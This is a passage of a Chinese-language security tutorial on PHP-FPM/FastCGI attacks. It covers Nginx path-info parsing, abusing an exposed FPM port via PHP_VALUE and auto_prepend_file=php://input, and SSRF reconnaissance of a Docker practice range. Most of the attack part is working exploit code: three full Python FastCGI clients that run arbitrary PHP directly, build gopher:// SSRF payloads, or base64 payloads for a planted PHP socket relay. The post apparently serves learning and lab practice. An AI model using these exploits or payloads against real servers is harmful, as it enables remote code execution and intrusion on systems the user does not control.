正常来说，`SCRIPT_FILENAME`的值是一个不存在的文件`/var/www/html/favicon.ico/.php`，是PHP设置中的一个选项`fix_pathinfo`导致了这个漏洞。PHP为了支持Path
Info模式而创造了`fix_pathinfo`，在这个选项被打开的情况下，fpm会判断`SCRIPT_FILENAME`是否存在，如果不存在则去掉最后一个`/`及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。

所以，第一次fpm发现`/var/www/html/favicon.ico/.php`不存在，则去掉`/.php`，再判断`/var/www/html/favicon.ico`是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。

正确的解决方法有两种，一是在Nginx端使用`fastcgi_split_path_info`将path
info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的`security.limit_extensions`配置项，避免其他后缀文件被解析。

###  Security.Limit_Extensions配置项

PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。

> 其实TCP模式下默认listen=127.0.0.1:9000（上面也能看见），除非工作人员手欠改成了0.0.0.0:9000就暴露了

此时，`SCRIPT_FILENAME`的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404：

![](https://p2.ssl.qhimg.com/t01bc73afd9d15acad5.png)

然后可以在

`/etc/php/7.3/fpm/pool.d/www.conf`（手动安装下）

`/php/php-5.5.38/etc/php-fpm.conf.default`和`/php/php-5.5.38/etc/php-fpm.conf`（PHPstudy）

找到`Security.Limit_Extensions`选项：

![](https://p5.ssl.qhimg.com/t018236d83e33661a71.png)

同时该配置选项也会影响到Nginx的解析漏洞（废话）

所以需要找到一个服务器端本身自带的PHP文件才行..然而安装PHP后自带了很多预PHP文件；假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如`/usr/local/lib/php/*`

虽然实际上，99%的站点都有index.php

![](https://p1.ssl.qhimg.com/t012b750661e6222730.png)

###  Fast-CGI攻击：FPM下TCP模式

那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？

理论上当然是不可以的，即使我们能控制`SCRIPT_FILENAME`，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。

但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，`auto_prepend_file`和`auto_append_file`。

`auto_prepend_file`是告诉PHP，在执行目标文件之前，先包含`auto_prepend_file`中指定的文件；`auto_append_file`是告诉PHP，在执行完成目标文件后，包含`auto_append_file`指向的文件。

那么就有趣了，假设我们设置`auto_prepend_file`为`php://input`，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项`allow_url_include`）

那么，我们怎么设置`auto_prepend_file`的值？

这又涉及到PHP-FPM的两个环境变量，`PHP_VALUE`和`PHP_ADMIN_VALUE`。这两个环境变量就是用来设置PHP配置项的，`PHP_VALUE`可以设置模式为`PHP_INI_USER`和`PHP_INI_ALL`的选项，`PHP_ADMIN_VALUE`可以设置所有选项。（`disable_functions`除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）

>
> `PHP_VALUE`影响的是一个FPM进程，`PHP_ADMIN_VALUE`影响的是所有的进程；如果重复发送EXP，所有的进程都会受到影响（因为CPU会中断交替呀），影响力就从普通的“`Value`”变成了“`admin_Value`”
>
> 当然的，如果想从外网访问到你已经认为攻击到的FPM进程，多在网页刷新几次才行哦:joy_cat:

所以，我们最后传入如下环境变量：

    
    
    {    'GATEWAY_INTERFACE': 'FastCGI/1.0',    'REQUEST_METHOD': 'GET',    'SCRIPT_FILENAME': '/var/www/html/index.php',    'SCRIPT_NAME': '/index.php',    'QUERY_STRING': '?a=1&b=2',    'REQUEST_URI': '/index.php?a=1&b=2',    'DOCUMENT_ROOT': '/var/www/html',    'SERVER_SOFTWARE': 'php/fcgiclient',    'REMOTE_ADDR': '127.0.0.1',    'REMOTE_PORT': '12345',    'SERVER_ADDR': '127.0.0.1',    'SERVER_PORT': '80',    'SERVER_NAME': "localhost",    'SERVER_PROTOCOL': 'HTTP/1.1'    'PHP_VALUE': 'auto_prepend_file = php://input',    'PHP_ADMIN_VALUE': 'allow_url_include = On'}
    

设置`auto_prepend_file = php://input`且`allow_url_include =
On`，然后将我们需要执行的代码放在Body中，即可执行任意代码。

成功如图所示

![](https://p2.ssl.qhimg.com/t01cab35d08a3e84ec8.png)

自己的魔改脚本如下（Linux限定，Windows暂无测试）：

    
    
    import socketimport randomimport argparseimport sysfrom io import BytesIO# 修改自: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode('utf-8', 'strict')def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s = str(s, 'utf-8', 'strict')    else:        s = str(s)    return sclass FastCGIClient:    """A Fast-CGI Client for Python"""    # private    __FCGI_VERSION = 1    __FCGI_ROLE_RESPONDER = 1    __FCGI_ROLE_AUTHORIZER = 2    __FCGI_ROLE_FILTER = 3    __FCGI_TYPE_BEGIN = 1    __FCGI_TYPE_ABORT = 2    __FCGI_TYPE_END = 3    __FCGI_TYPE_PARAMS = 4    __FCGI_TYPE_STDIN = 5    __FCGI_TYPE_STDOUT = 6    __FCGI_TYPE_STDERR = 7    __FCGI_TYPE_DATA = 8    __FCGI_TYPE_GETVALUES = 9    __FCGI_TYPE_GETVALUES_RESULT = 10    __FCGI_TYPE_UNKOWNTYPE = 11    __FCGI_HEADER_SIZE = 8    # request state    FCGI_STATE_SEND = 1    FCGI_STATE_ERROR = 2    FCGI_STATE_SUCCESS = 3    def __init__(self, host, port, timeout, keepalive):        self.host = host        self.port = port        self.timeout = timeout        if keepalive:            self.keepalive = 1        else:            self.keepalive = 0        self.sock = None        self.requests = dict()    def __connect(self):        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        try:            self.sock.connect((self.host, int(self.port)))        except socket.error as msg:            self.sock.close()            self.sock = None            print(repr(msg))            return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length = len(content)        buf = bchr(FastCGIClient.__FCGI_VERSION) \               + bchr(fcgi_type) \               + bchr((requestid >> 8) & 0xFF) \               + bchr(requestid & 0xFF) \               + bchr((length >> 8) & 0xFF) \               + bchr(length & 0xFF) \               + bchr(0) \               + bchr(0) \               + content        return buf    def __encodeNameValueParams(self, name, value):        nLen = len(name)        vLen = len(value)        record = b''        if nLen < 128:            record += bchr(nLen)        else:            record += bchr((nLen >> 24) | 0x80) \                      + bchr((nLen >> 16) & 0xFF) \                      + bchr((nLen >> 8) & 0xFF) \                      + bchr(nLen & 0xFF)        if vLen < 128:            record += bchr(vLen)        else:            record += bchr((vLen >> 24) | 0x80) \                      + bchr((vLen >> 16) & 0xFF) \                      + bchr((vLen >> 8) & 0xFF) \                      + bchr(vLen & 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header = dict()        header['version'] = bord(stream[0])        header['type'] = bord(stream[1])        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])        header['paddingLength'] = bord(stream[6])        header['reserved'] = bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header = buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record = self.__decodeFastCGIHeader(header)            record['content'] = b''                        if 'contentLength' in record.keys():                contentLength = int(record['contentLength'])                record['content'] += buffer.read(contentLength)            if 'paddingLength' in record.keys():                skiped = buffer.read(int(record['paddingLength']))            return record    def request(self, nameValuePairs={}, post=''):        if not self.__connect():            print('connect failure! please check your fasctcgi-server !!')            return        requestId = random.randint(1, (1 << 16) - 1)        self.requests[requestId] = dict()        request = b""        beginFCGIRecordContent = bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b''        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)        if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)        if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)        self.sock.send(request)        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND        self.requests[requestId]['response'] = b''        return self.__waitForResponse(requestId)    def __waitForResponse(self, requestId):        data = b''        while True:            buf = self.sock.recv(512)            if not len(buf):                break            data += buf        data = BytesIO(data)        while True:            response = self.__decodeFastCGIRecord(data)            if not response:                break            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR                if requestId == int(response['requestId']):                    self.requests[requestId]['response'] += response['content']            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId]['response']    def __repr__(self):        return "fastcgi connect host:{} port:{}".format(self.host, self.port)if __name__ == '__main__':    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')    parser.add_argument('-u','--host', help='Target host, such as 127.0.0.1')    parser.add_argument('-f','--file', default="/var/www/html/index.php",help='A php file absolute path, such as /usr/local/lib/php/System.php')    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)    args = parser.parse_args()    client = FastCGIClient(args.host, args.port, 3, 0)    params = dict()    documentRoot = "/"    uri = args.file    content = args.code    params = {        'GATEWAY_INTERFACE': 'FastCGI/1.0',        'REQUEST_METHOD': 'POST',        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),        'SCRIPT_NAME': uri,        'QUERY_STRING': '',        'REQUEST_URI': uri,        'DOCUMENT_ROOT': documentRoot,        'SERVER_SOFTWARE': 'php/fcgiclient',        'REMOTE_ADDR': '127.0.0.1',        'REMOTE_PORT': '9985',        'SERVER_ADDR': '127.0.0.1',        'SERVER_PORT': '80',        'SERVER_NAME': "localhost",        'SERVER_PROTOCOL': 'HTTP/1.1',        'CONTENT_TYPE': 'application/text',        'CONTENT_LENGTH': "%d" % len(content),        'PHP_VALUE': 'auto_prepend_file = php://input',        'PHP_ADMIN_VALUE': 'allow_url_include = On'    }    response = client.request(params, content)    print(force_text(response))
    

如果你只是想要获得Payload，方便利用SSRF打进去的话，我又改了一下：

    
    
    import socketimport base64import randomimport argparseimport sysfrom io import BytesIOimport urllib.parsePY2 = True if sys.version_info.major == 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode('utf-8', 'strict')def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s = str(s, 'utf-8', 'strict')    else:        s = str(s)    return sclass FastCGIClient:    """A Fast-CGI Client for Python"""    # private    __FCGI_VERSION = 1    __FCGI_ROLE_RESPONDER = 1    __FCGI_ROLE_AUTHORIZER = 2    __FCGI_ROLE_FILTER = 3    __FCGI_TYPE_BEGIN = 1    __FCGI_TYPE_ABORT = 2    __FCGI_TYPE_END = 3    __FCGI_TYPE_PARAMS = 4    __FCGI_TYPE_STDIN = 5    __FCGI_TYPE_STDOUT = 6    __FCGI_TYPE_STDERR = 7    __FCGI_TYPE_DATA = 8    __FCGI_TYPE_GETVALUES = 9    __FCGI_TYPE_GETVALUES_RESULT = 10    __FCGI_TYPE_UNKOWNTYPE = 11    __FCGI_HEADER_SIZE = 8    # request state    FCGI_STATE_SEND = 1    FCGI_STATE_ERROR = 2    FCGI_STATE_SUCCESS = 3    def __init__(self, host, port, timeout, keepalive):        self.host = host        self.port = port        self.timeout = timeout        if keepalive:            self.keepalive = 1        else:            self.keepalive = 0        self.sock = None        self.requests = dict()    def __connect(self):        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        try:            self.sock.connect((self.host, int(self.port)))        except socket.error as msg:            self.sock.close()            self.sock = None            print(repr(msg))            return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length = len(content)        buf = bchr(FastCGIClient.__FCGI_VERSION) \               + bchr(fcgi_type) \               + bchr((requestid >> 8) & 0xFF) \               + bchr(requestid & 0xFF) \               + bchr((length >> 8) & 0xFF) \               + bchr(length & 0xFF) \               + bchr(0) \               + bchr(0) \               + content        return buf    def __encodeNameValueParams(self, name, value):        nLen = len(name)        vLen = len(value)        record = b''        if nLen < 128:            record += bchr(nLen)        else:            record += bchr((nLen >> 24) | 0x80) \                      + bchr((nLen >> 16) & 0xFF) \                      + bchr((nLen >> 8) & 0xFF) \                      + bchr(nLen & 0xFF)        if vLen < 128:            record += bchr(vLen)        else:            record += bchr((vLen >> 24) | 0x80) \                      + bchr((vLen >> 16) & 0xFF) \                      + bchr((vLen >> 8) & 0xFF) \                      + bchr(vLen & 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header = dict()        header['version'] = bord(stream[0])        header['type'] = bord(stream[1])        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])        header['paddingLength'] = bord(stream[6])        header['reserved'] = bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header = buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record = self.__decodeFastCGIHeader(header)            record['content'] = b''                        if 'contentLength' in record.keys():                contentLength = int(record['contentLength'])                record['content'] += buffer.read(contentLength)            if 'paddingLength' in record.keys():                skiped = buffer.read(int(record['paddingLength']))            return record    def request(self, nameValuePairs={}, post=''):       # if not self.__connect():        #    print('connect failure! please check your fasctcgi-server !!')         #   return        requestId = random.randint(1, (1 << 16) - 1)        self.requests[requestId] = dict()        request = b""        beginFCGIRecordContent = bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b''        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)        if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)        if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)        #print base64.b64encode(request)        return request        # self.sock.send(request)        # self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND        # self.requests[requestId]['response'] = b''        # return self.__waitForResponse(requestId)    def __waitForResponse(self, requestId):        data = b''        while True:            buf = self.sock.recv(512)            if not len(buf):                break            data += buf        data = BytesIO(data)        while True:            response = self.__decodeFastCGIRecord(data)            if not response:                break            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR                if requestId == int(response['requestId']):                    self.requests[requestId]['response'] += response['content']            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId]['response']    def __repr__(self):        return "fastcgi connect host:{} port:{}".format(self.host, self.port)if __name__ == '__main__':    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')    parser.add_argument('-u','--host', default="127.0.0.1",help='Target host, such as 127.0.0.1')    parser.add_argument('-f','--file', default="/var/www/html/index.php",help='A php file absolute path, such as /usr/local/lib/php/System.php')    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)    args = parser.parse_args()    client = FastCGIClient(args.host, args.port, 3, 0)    params = dict()    documentRoot = "/"    uri = args.file    content = args.code    params = {        'GATEWAY_INTERFACE': 'FastCGI/1.0',        'REQUEST_METHOD': 'POST',        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),        'SCRIPT_NAME': uri,        'QUERY_STRING': '',        'REQUEST_URI': uri,        'DOCUMENT_ROOT': documentRoot,        'SERVER_SOFTWARE': 'php/fcgiclient',        'REMOTE_ADDR': '127.0.0.1',        'REMOTE_PORT': '9985',        'SERVER_ADDR': '127.0.0.1',        'SERVER_PORT': '80',        'SERVER_NAME': "localhost",        'SERVER_PROTOCOL': 'HTTP/1.1',        'CONTENT_TYPE': 'application/text',        'CONTENT_LENGTH': "%d" % len(content),        'PHP_VALUE': 'auto_prepend_file = php://input',        'PHP_ADMIN_VALUE': 'allow_url_include = On'    }    response = client.request(params, content)    response = urllib.parse.quote(response)    print(urllib.parse.quote("gopher://" +str(args.host)+":"+str(args.port) + "/_" + response))
    

用法类似，不过是生成payload而已

![](https://p5.ssl.qhimg.com/t0128ff914f4cb8c981.png)

当然，也可以使用Gopherus生成payload

![](https://p3.ssl.qhimg.com/t0188ed1d9c1db8ac18.png)

效果一样的

![](https://p0.ssl.qhimg.com/t01dc28999ffd8bc4de.png)

###  Fast-CGI攻击：FPM下Socket模式

默认配置下就是这个模式

本地系统的进程们使用同一个Unix套接字相互通信，所以无法SSRF远程攻击（因为压根没走网络协议层:sob:)

这种情况就适合目标主机存在两套PHP环境，一套防护力度很强，比如phpstudy等面板搭建的；一套是手动搭建的，默认是fastcgi且socket模式；这样就可以绕过了。很多企业环境没配好或者没卸载干净就会这个样子，很常见。这个时候需要在目标站点写个php文件，内容如下：

    
    
    <?php$sock=stream_socket_client('unix:///run/php/php7.3-fpm.sock');$temp=base64_decode($_POST['x']);fputs($sock, $temp);var_dump(fread($sock, 4096));#var_dump(iconv('gbk','utf-8',fread($sock,4096)));?>
    

代码很简单，直接把payload传给套接字发出去而已；payload使用魔改后的脚本，当然可以不需要base64编码，方便后续压缩而已：

    
    
    import socketimport base64import randomimport argparseimport sysimport urllib.parsefrom io import BytesIOimport urllib.parse# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode('utf-8', 'strict')def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s = str(s, 'utf-8', 'strict')    else:        s = str(s)    return sclass FastCGIClient:    """A Fast-CGI Client for Python"""    # private    __FCGI_VERSION = 1    __FCGI_ROLE_RESPONDER = 1    __FCGI_ROLE_AUTHORIZER = 2    __FCGI_ROLE_FILTER = 3    __FCGI_TYPE_BEGIN = 1    __FCGI_TYPE_ABORT = 2    __FCGI_TYPE_END = 3    __FCGI_TYPE_PARAMS = 4    __FCGI_TYPE_STDIN = 5    __FCGI_TYPE_STDOUT = 6    __FCGI_TYPE_STDERR = 7    __FCGI_TYPE_DATA = 8    __FCGI_TYPE_GETVALUES = 9    __FCGI_TYPE_GETVALUES_RESULT = 10    __FCGI_TYPE_UNKOWNTYPE = 11    __FCGI_HEADER_SIZE = 8    # request state    FCGI_STATE_SEND = 1    FCGI_STATE_ERROR = 2    FCGI_STATE_SUCCESS = 3    def __init__(self, host, port, timeout, keepalive):        self.host = host        self.port = port        self.timeout = timeout        if keepalive:            self.keepalive = 1        else:            self.keepalive = 0        self.sock = None        self.requests = dict()    def __connect(self):        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        try:            self.sock.connect((self.host, int(self.port)))        except socket.error as msg:            self.sock.close()            self.sock = None            print(repr(msg))            return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length = len(content)        buf = bchr(FastCGIClient.__FCGI_VERSION) \               + bchr(fcgi_type) \               + bchr((requestid >> 8) & 0xFF) \               + bchr(requestid & 0xFF) \               + bchr((length >> 8) & 0xFF) \               + bchr(length & 0xFF) \               + bchr(0) \               + bchr(0) \               + content        return buf    def __encodeNameValueParams(self, name, value):        nLen = len(name)        vLen = len(value)        record = b''        if nLen < 128:            record += bchr(nLen)        else:            record += bchr((nLen >> 24) | 0x80) \                      + bchr((nLen >> 16) & 0xFF) \                      + bchr((nLen >> 8) & 0xFF) \                      + bchr(nLen & 0xFF)        if vLen < 128:            record += bchr(vLen)        else:            record += bchr((vLen >> 24) | 0x80) \                      + bchr((vLen >> 16) & 0xFF) \                      + bchr((vLen >> 8) & 0xFF) \                      + bchr(vLen & 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header = dict()        header['version'] = bord(stream[0])        header['type'] = bord(stream[1])        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])        header['paddingLength'] = bord(stream[6])        header['reserved'] = bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header = buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record = self.__decodeFastCGIHeader(header)            record['content'] = b''                        if 'contentLength' in record.keys():                contentLength = int(record['contentLength'])                record['content'] += buffer.read(contentLength)            if 'paddingLength' in record.keys():                skiped = buffer.read(int(record['paddingLength']))            return record    def request(self, nameValuePairs={}, post=''):       # if not self.__connect():        #    print('connect failure! please check your fasctcgi-server !!')         #   return        requestId = random.randint(1, (1 << 16) - 1)        self.requests[requestId] = dict()        request = b""        beginFCGIRecordContent = bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b''        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)        if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)        if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)        print(base64.b64encode(request))        #return request        # self.sock.send(request)        # self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND        # self.requests[requestId]['response'] = b''        # return self.__waitForResponse(requestId)    def __waitForResponse(self, requestId):        data = b''        while True:            buf = self.sock.recv(512)            if not len(buf):                break            data += buf        data = BytesIO(data)        while True:            response = self.__decodeFastCGIRecord(data)            if not response:                break            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR                if requestId == int(response['requestId']):                    self.requests[requestId]['response'] += response['content']            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId]['response']    def __repr__(self):        return "fastcgi connect host:{} port:{}".format(self.host, self.port)if __name__ == '__main__':    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')    parser.add_argument('-u','--host', default="127.0.0.1",help='Target host, such as 127.0.0.1')    parser.add_argument('-f','--file', default="/var/www/html/index.php",help='A php file absolute path, such as /usr/local/lib/php/System.php')    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)    args = parser.parse_args()    client = FastCGIClient(args.host, args.port, 3, 0)    params = dict()    documentRoot = "/"    uri = args.file    content = args.code    params = {        'GATEWAY_INTERFACE': 'FastCGI/1.0',        'REQUEST_METHOD': 'POST',        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),        'SCRIPT_NAME': uri,        'QUERY_STRING': '',        'REQUEST_URI': uri,        'DOCUMENT_ROOT': documentRoot,        'SERVER_SOFTWARE': 'php/fcgiclient',        'REMOTE_ADDR': '127.0.0.1',        'REMOTE_PORT': '9985',        'SERVER_ADDR': '127.0.0.1',        'SERVER_PORT': '80',        'SERVER_NAME': "localhost",        'SERVER_PROTOCOL': 'HTTP/1.1',        'CONTENT_TYPE': 'application/text',        'CONTENT_LENGTH': "%d" % len(content),        'PHP_VALUE': 'auto_prepend_file = php://input',        'PHP_ADMIN_VALUE': 'allow_url_include = On'    }    #response = client.request(params, content)    client.request(params, content)    # response = urllib.parse.quote(response)    # print(urllib.parse.quote("gopher://" +str(args.host)+":"+str(args.port) + "/_" + response))
    

使用方法还是一样的，生成的payload如下：

![](https://p2.ssl.qhimg.com/t011a08dd09a46bc02c.png)

发给你写的文件就好了，记得URL编码一下= =

![](https://p4.ssl.qhimg.com/t01a62ad5d3e050a617.png)

###  手动安装Apache-Module

    
    
    apt updateapt install -y apache2apt install -y software-properties-commonadd-apt-repository -y ppa:ondrej/phpapt updateapt install -y libapache2-mod-php7.3      #这个就是apache的内置php模块service apache2 start                      #因为php内置在apache,所以只需要启一个服务

###  手动安装Nginx-FastCGI

如果采用RPM包方式安装php，那么默认安装路径应该在/etc/ 目录下；如果采用源代码方式安装php，那么一般默认安装在/usr/local/lib
目录下

    
    
    apt updateapt install -y nginxapt install -y software-properties-commonadd-apt-repository -y ppa:ondrej/phpapt updateapt install -y php7.3-fpmapt install vim
    

然后`vim /etc/nginx/sites-enabled/default`选择性注释60和62

![](https://p3.ssl.qhimg.com/t0191b423a6effab583.png)

sock的话记得找找自己php对应的版本哈，不一样的

然后找php`vim /etc/php/7.3/fpm/pool.d/www.conf`看着注释哪一个

![](https://p3.ssl.qhimg.com/t01391ba89b21b6d488.png)

然后按序启动

> /etc/init.d/php7.3-fpm start #php-fpm 是一个独立的进程，需要单独启动
>
> service nginx start

为啥只启动php-fpm就可以了，那不是个进程管理器吗？你肯定想问

现在的新版FPM集成了PHP环境而已，不要误解:laughing:还是有进程管理的功能在的

###  参考链接

<https://cloud.tencent.com/developer/article/1425023>

<https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html>

## SSRF拟真靶场

用的国光师傅写的靶场，灰常棒！[链接](https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-28)

###  使用方法

  1. 进入到目录下
  2. 按序`sudo docker load --input 172.72.23.2x.tar`，全部导入为止
  3. `sudo docker-compose up -d`开启环境食用！

###  拓扑图

![](https://p0.ssl.qhimg.com/t0177a85963a48f7be5.png)

###  信息收集

该网站公网只开了8080端口，且只有一个搜索框，输入[http://www.baidu.com/robots.txt看看](http://www.baidu.com/robots.txt%E7%9C%8B%E7%9C%8B)

![](https://p2.ssl.qhimg.com/t01f6ad5cb21bff81b6.png)

好家伙这一看就是SSRF…下图也验证了

![](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/OWA_TOP10/SSRF/Labs基础和实例/拟真靶场2.5.png)

然后用`file:///etc/hosts`看一下内网网段

![](https://p5.ssl.qhimg.com/t01246b6b76852bb4f0.png)

> 权限高的情况下还可以尝试读取 `/proc/net/arp` 或者 `/etc/network/interfaces` 来判断当前机器的网络情况

然后使用dict协议探测内网吧（一般只有TCP端口会回显）即`dict://172.72.23.2X:X/`结果如下

![](https://p1.ssl.qhimg.com/t01f7a5ae9032456faa.png)

> 172.72.23.21 : 80
>
> 172.72.23.22 : 80
>
> 172.72.23.23 : 80、3306
>
> 172.72.23.24 :80
>
> 172.72.23.25 : 80
>
> 172.72.23.26 : 8080
>
> 172.72.23.27 – 6379
>
> 172.72.23.28 – 6379
>
> 172.72.23.29 – 3306

和拓扑图一样，说明环境没问题~可以开始了

